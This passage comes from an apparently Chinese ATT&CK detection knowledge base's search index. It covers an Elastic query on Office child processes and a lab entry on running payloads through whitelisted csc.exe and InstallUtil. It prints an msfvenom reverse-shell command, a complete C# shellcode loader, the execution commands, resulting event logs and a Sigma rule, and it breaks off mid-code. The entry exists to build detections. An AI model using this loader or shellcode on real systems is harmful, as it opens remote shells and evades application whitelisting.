process.name:(Microsoft.Workflow.Compiler.exe or arp.exe or atbroker.exe or bginfo.exe or bitsadmin.exe or cdb.exe or certutil.exe or cmd.exe or cmstp.exe or cscript.exe or csi.exe or dnx.exe or dsget.exe or dsquery.exe or forfiles.exe or fsi.exe or ftp.exe or gpresult.exe or hostname.exe or ieexec.exe or iexpress.exe or installutil.exe or ipconfig.exe or mshta.exe or msxsl.exe or nbtstat.exe or net.exe or net1.exe or netsh.exe or netstat.exe or nltest.exe or odbcconf.exe or ping.exe or powershell.exe or pwsh.exe or qprocess.exe or quser.exe or qwinsta.exe or rcsi.exe or reg.exe or regasm.exe or regsvcs.exe or regsvr32.exe or sc.exe or schtasks.exe or systeminfo.exe or tasklist.exe or tracert.exe or whoami.exe or wmic.exe or wscript.exe or xwizard.exe)","title":"Elastic rule query"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_6","text":"\u53ef\u81ea\u884c\u8f6c\u6362\u4e3asigma\u683c\u5f0f\uff0c\u6765\u5b9e\u73b0\u5bf9\u591a\u4e2a\u5e73\u53f0\u7684\u652f\u6301\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1566-001-win-%E5%8F%AF%E7%96%91%E7%9A%84MS%20Office%E5%AD%90%E8%BF%9B%E7%A8%8B/#_7","text":"MITRE-ATT&CK-T1566-001 https://attack.mitre.org/techniques/T10566/001/ \u68c0\u6d4b\u53ef\u7591\u7684MS Office\u5b50\u8fdb\u7a0b https://www.elastic.co/guide/en/siem/guide/current/suspicious-ms-office-child-process.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/","text":"T1027-004-win-\u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u914d\u7f6epayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002 \u6d4b\u8bd5\u6848\u4f8b C#\u7684\u5728Windows\u5e73\u53f0\u4e0b\u7684\u7f16\u8bd1\u5668\u540d\u79f0\u662fCsc.exe\uff0c\u5982\u679c\u4f60\u7684.NET FrameWork SDK\u5b89\u88c5\u5728C\u76d8\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5728C:\\WINNT\\Microsoft.NET\\Framework\\xxxxx\u76ee\u5f55\u4e2d\u53d1\u73b0\u5b83\u3002\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u4f60\u53ef\u4ee5\u624b\u52a8\u628a\u8fd9\u4e2a\u76ee\u5f55\u6dfb\u52a0\u5230Path\u73af\u5883\u53d8\u91cf\u4e2d\u53bb\u3002\u7528Csc.exe\u7f16\u8bd1HelloWorld.cs\u975e\u5e38\u7b80\u5355\uff0c\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5e76\u5207\u6362\u5230\u5b58\u653e test.cs\u6587\u4ef6\u7684\u76ee\u5f55\u4e2d\uff0c\u8f93\u5165\u4e0b\u5217\u884c\u547d\u4ee4:csc /target:exe test.cs \u5c06Ttest.cs \u7f16\u8bd1\u6210\u540d\u4e3a test.exe \u7684 console \u5e94\u7528\u7a0b\u5e8f \u8bf4\u660e\uff1aCsc.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0ccsc\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012 \u6d4b\u8bd5\u8fc7\u7a0b \u914d\u7f6epayload msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp copy buf \u5230 Micropoor_Csc.cs shellcode\u4e2d\u3002 Micropoor_Csc.cs using System; using System.Net; using System.Diagnostics; using System.Reflection; using System.Configuration.Install; using System.Runtime.InteropServices; // msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Shellcode.Exec(); } } public class Shellcode { public static void Exec() { byte[] shellcode = new byte[510] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b, 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b, 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41, 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1, 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45, 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b, 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01, 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48, 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9, 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00, 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5, 0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4, 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68, 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a, 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89, 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5, 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba, 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5, 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9, 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5, 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41, 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41, 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31, 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8, 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40, 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c, 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41, 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern bool CloseHandle(IntPtr handle); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); [DllImport(\"kernel32\")] private static extern IntPtr GetModuleHandle( string moduleName ); [DllImport(\"kernel32\")] private static extern UInt32 GetProcAddress( IntPtr hModule, string procName ); [DllImport(\"kernel32\")] private static extern UInt32 LoadLibrary( string lpFileName ); [DllImport(\"kernel32\")] private static extern UInt32 GetLastError(); } \u9776\u673a\u6267\u884c C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe \u83b7\u53d6\u4f1a\u8bdd \u672a\u80fd\u6210\u529f\u83b7\u53d6\u4f1a\u8bdd\uff0c\u4f46\u4e0d\u5f71\u54cd\u9488\u5bf9\u6b64\u884c\u4e3a\u8fdb\u884c\u5206\u6790\u3002 \u6d4b\u8bd5\u7559\u75d5 \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xa9c \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:1.exe /platform:x64 /unsafe C:\\Users\\Administrator\\Desktop\\a\\1.cs \u4e8b\u4ef6ID\uff1a 4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0x984 \u65b0\u8fdb\u7a0b\u540d\u79f0:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b:TokenElevationTypeDefault (1) \u521b\u5efa\u8005\u8fdb\u7a0b ID:0xaa0 \u8fdb\u7a0b\u547d\u4ee4\u884c:C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Administrator\\Desktop\\a\\1.exe \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Suspicious Parent of Csc.exe description: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery status: experimental references: - https://twitter.com/SBousseaden/status/1094924091256176641 tags: - attack.defense_evasion - attack.t1027-004 logsource: category: process_creation product: windows detection: selection: Image: '*\\csc.exe*' ParentImage: - '*\\wscript.exe' - '*\\cscript.exe' - '*\\mshta.exe' condition: selection falsepositives: - Unkown level: high \u5efa\u8bae \u53ef\u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1027-004 https://attack.mitre.org/techniques/T1027/004/ \u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u6267\u884cpayload\u7b2c\u4e03\u5b63 https://micro8.gitbook.io/micro8/contents-1/71-80/77-ji-yu-bai-ming-dan-csc.exe-zhi-hang-payload-di-qi-ji","title":"T1027-004-win-\u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u914d\u7f6epayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#t1027-004-win-cscexepayload","text":"","title":"T1027-004-win-\u57fa\u4e8e\u767d\u540d\u5355Csc.exe\u914d\u7f6epayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#attck","text":"\u8bb8\u591a\u8f6f\u4ef6\u5f00\u53d1\u76f8\u5173\u7684\u5b9e\u7528\u7a0b\u5e8f\u53ef\u7528\u4e8e\u6267\u884c\u5404\u79cd\u5f62\u5f0f\u7684\u4ee3\u7801\u4ee5\u534f\u52a9\u5f00\u53d1\u3001\u8c03\u8bd5\u548c\u9006\u5411\u5de5\u7a0b\u3002\u8fd9\u4e9b\u5b9e\u7528\u7a0b\u5e8f\u901a\u5e38\u53ef\u4ee5\u4f7f\u7528\u5408\u6cd5\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002\u7b7e\u540d\u540e\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u5728\u7cfb\u7edf\u4e0a\u6267\u884c\uff0c\u5e76\u901a\u8fc7\u53ef\u4fe1\u7684\u8fdb\u7a0b\u4ee3\u7406\u6267\u884c\u6076\u610f\u4ee3\u7801\uff0c\u4ece\u800c\u6709\u6548\u5730\u7ed5\u8fc7\u5e94\u7528\u767d\u540d\u5355\u9632\u5fa1\u89e3\u51b3\u65b9\u6848\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_1","text":"C#\u7684\u5728Windows\u5e73\u53f0\u4e0b\u7684\u7f16\u8bd1\u5668\u540d\u79f0\u662fCsc.exe\uff0c\u5982\u679c\u4f60\u7684.NET FrameWork SDK\u5b89\u88c5\u5728C\u76d8\uff0c\u90a3\u4e48\u4f60\u53ef\u4ee5\u5728C:\\WINNT\\Microsoft.NET\\Framework\\xxxxx\u76ee\u5f55\u4e2d\u53d1\u73b0\u5b83\u3002\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u4f60\u53ef\u4ee5\u624b\u52a8\u628a\u8fd9\u4e2a\u76ee\u5f55\u6dfb\u52a0\u5230Path\u73af\u5883\u53d8\u91cf\u4e2d\u53bb\u3002\u7528Csc.exe\u7f16\u8bd1HelloWorld.cs\u975e\u5e38\u7b80\u5355\uff0c\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5e76\u5207\u6362\u5230\u5b58\u653e test.cs\u6587\u4ef6\u7684\u76ee\u5f55\u4e2d\uff0c\u8f93\u5165\u4e0b\u5217\u884c\u547d\u4ee4:csc /target:exe test.cs \u5c06Ttest.cs \u7f16\u8bd1\u6210\u540d\u4e3a test.exe \u7684 console \u5e94\u7528\u7a0b\u5e8f \u8bf4\u660e\uff1aCsc.exe\u6240\u5728\u8def\u5f84\u6ca1\u6709\u88ab\u7cfb\u7edf\u6dfb\u52a0PATH\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u56e0\u6b64\uff0ccsc\u547d\u4ee4\u65e0\u6cd5\u8bc6\u522b\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 win7\u9ed8\u8ba4\u4f4d\u7f6e\uff1a C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u914d\u7f6e\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awindows server 2012","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#_5","text":"","title":"\u6d4b\u8bd5\u8fc7\u7a0b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#payload","text":"msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp copy buf \u5230 Micropoor_Csc.cs shellcode\u4e2d\u3002","title":"\u914d\u7f6epayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1027-004-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc.exe%E9%85%8D%E7%BD%AEpayload/#micropoor_csccs","text":"using System; using System.Net; using System.Diagnostics; using System.Reflection; using System.Configuration.Install; using System.Runtime.InteropServices; // msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.126.146 lport=4444 -f csharp public class Program { public static void Main() { } } [System.ComponentModel.RunInstaller(true)] public class Sample : System.Configuration.Install.Installer { public override void Uninstall(System.Collections.IDictionary savedState) { Shellcode.Exec(); } } public class Shellcode { public static void Exec() { byte[] shellcode = new byte[510] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52, 0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48, 0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9, 0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41, 0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48, 0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b, 0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b, 0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41, 0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1, 0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45, 0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b, 0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01, 0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48, 0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9, 0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00, 0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5, 0x49,0xbc,0x02,0x00,0x11,0x5c,0xc0,0xa8,0x7e,0x92,0x41,0x54,0x49,0x89,0xe4, 0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68, 0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a, 0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89, 0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5, 0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba, 0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5, 0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9, 0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5, 0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41, 0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41, 0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31, 0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8, 0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40, 0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5, 0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c, 0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41, 0xff,0xe7,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 }; UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length); IntPtr hThread = IntPtr.Zero; UInt32 threadId = 0; IntPtr pinfo = IntPtr.Zero; hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId); WaitForSingleObject(hThread, 0xFFFFFFFF); } private static UInt32 MEM_COMMIT = 0x1000; private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; [DllImport(\"kernel32\")] private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect); [DllImport(\"kernel32\")] private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType); [DllImport(\"kernel32\")] private static extern IntPtr CreateThread( UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId ); [DllImport(\"kernel32\")] private static extern bool CloseHandle(IntPtr handle); [DllImport(\"kernel32\")] private static extern UInt32 WaitForSingleObject( IntPtr hHandle, UInt32 dwMilliseconds ); 